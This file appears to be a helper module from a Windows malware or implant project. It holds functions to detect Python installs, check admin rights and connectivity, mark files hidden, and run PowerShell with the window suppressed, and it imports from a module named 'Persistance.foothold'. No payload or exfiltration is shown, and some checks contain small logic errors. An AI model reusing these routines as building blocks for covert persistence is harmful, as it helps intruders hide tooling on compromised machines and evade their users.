import ctypes
import os
import platform
import random
import string
import subprocess
import sys
import requests
import ast
import winreg
requests.packages.urllib3.disable_warnings()
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW



def top_level_functions(body):
    return (f for f in body if isinstance(f, ast.FunctionDef))


def parse_ast(code):
    return ast.parse(code)


def is_online():
    try:
        x = requests.get('https://google.com', verify=False)
        return True
    except Exception as e:
        return False


def is_python_exist():
    possible_location = ['c:/Program Files','c:/Program Files (x86)','c:/ProgramData']
    p = subprocess.run(['powershell',
                        """$p = &{python -V} 2>&1;$version = if($p -is [System.Management.Automation.ErrorRecord]){$p.Exception.Message}; $p"""],
                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, startupinfo=startupinfo)
    res = p.stdout.decode()
    print(res)
    if 'python' in res.lower() and 'The term' not in res.lower() and 'find' not in res.lower() and 'not found' not in res.lower():
        print('true')
        return True
    for num in range(10, 45):
        if os.path.exists(f"C:/Users/{os.getlogin()}/Appdata/Local/Programs/Python/Python{num}/python.exe"):
            return True

    for location in possible_location:
        for file in os.listdir(location):
            if os.path.isdir(file) and 'python' in file.lower():
                return True
    return False


def is_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin


def hide_path(p):
    return ctypes.windll.kernel32.SetFileAttributesW(p, 0x02)


def random_string(length):
    return ''.join((random.choice(string.ascii_letters) for x in range(length)))


def run_pwsh(code):
    p = subprocess.run(['powershell', code], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    return p.stdout.decode()


def is_os_64bit():
    return platform.machine().endswith('64')


def find_python_path() -> str:
    from Persistance.foothold import pip_install
    base_path = f"c:/users/{os.getlogin()}/appdata/local/programs/python"
    c = 0
    found_python = []
    for folder in os.listdir(base_path):
        if '3' in folder:
            found_python.append(folder)
    if len(found_python) > 1:
        for folder in found_python:
            p = subprocess.run(['powershell',
                                f"""{os.path.join(os.path.join(base_path, folder), 'python.exe')} -m pip list """],
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True,
                               startupinfo=startupinfo)
            res = p.stdout.decode()
            if 'cryptography' and 'netifaces' in res:
                return os.path.join(base_path, folder)
            pip_install(os.path.join(os.path.join(base_path, folder), 'python.exe'))
            return os.path.join(base_path, folder)
    elif len(found_python) == 1:
        return os.path.join(base_path, found_python[0])
    else:
        sys.exit()


def is_msvc_exist():
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,"SOFTWARE\Wow6432Node\Microsoft\VisualStudio",0)
            return True
        except Exception as e:
            return False